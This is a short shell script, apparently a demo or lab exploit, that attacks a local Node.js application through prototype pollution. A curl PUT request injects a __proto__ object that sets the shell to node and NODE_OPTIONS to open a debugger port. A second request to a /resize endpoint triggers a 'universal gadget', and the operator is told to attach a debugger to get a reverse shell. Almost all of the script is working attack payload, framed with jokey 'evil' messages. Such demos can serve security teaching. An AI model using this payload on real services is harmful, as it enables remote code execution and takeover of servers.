echo "☠️  💉 Poisoning the prototype with evil values...\n"

sleep 2

curl --silent --location --request PUT 'http://localhost:3000/users/1' \
--header 'Content-Type: application/json' \
--data-raw '{
    "__proto__": {
        "shell": "node",
        "NODE_OPTIONS": "--inspect-brk=127.0.0.1:2412"
    },
    "name": "Jardel Matias",
    "email": "jardel.matias@example.com"
}' > /dev/null

echo "😈 Evil payload sent! \n"

sleep 2

echo '🎯 Triggering the universal gadget to get a reverse shell... 🔁 💻 \n'

sleep 2

# This request will hang the application because of the debug session, chop chop!
curl -s --location 'http://localhost:3000/resize' \
--header 'Content-Type: application/json' \
--data '{
    "imageUrl": "https://i.pinimg.com/564x/46/6f/5f/466f5fcd4e38cca538c9755cf8183c39.jpg",
    "width": 500,
    "height": 500
}' &

echo '💻 Please now start your debugging session to get your reverse shell... 🔁 💻\n'
echo '🎄🎅🏻 HAPPY HACKING AND MERRY CHRISTMAS 🎄🎅🏻'